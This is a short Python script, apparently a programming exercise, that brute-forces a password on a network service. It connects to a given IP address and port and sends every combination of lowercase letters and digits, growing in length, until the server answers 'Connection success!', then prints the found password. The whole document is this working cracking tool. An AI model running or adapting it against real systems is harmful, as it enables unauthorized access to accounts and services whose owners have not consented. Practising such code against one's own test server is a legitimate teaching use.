import argparse

import itertools

import string

import socket


def pass_generator(length=1):
    global ALL_SYMBOLS
    generator = itertools.product(ALL_SYMBOLS, repeat=length)
    for i in generator:
        yield i


BUF_SIZE = 1024
ALL_SYMBOLS = string.ascii_lowercase + string.digits

parser = argparse.ArgumentParser()
parser.add_argument('ip_address')
parser.add_argument('port')
args = parser.parse_args()
pass_gen = pass_generator()
pass_length = 1
m = 0
with socket.socket() as client_socket:
    client_socket.connect((args.ip_address, int(args.port)))
    while m < 1_000_000:
        try:
            password = ''.join([x for x in next(pass_gen)])
            client_socket.send(password.encode())
            response = client_socket.recv(BUF_SIZE).decode()
            if response == 'Connection success!':
                print(password)
                break
            m += 1
        except StopIteration:
            pass_length += 1
            pass_gen = pass_generator(pass_length)
            continue
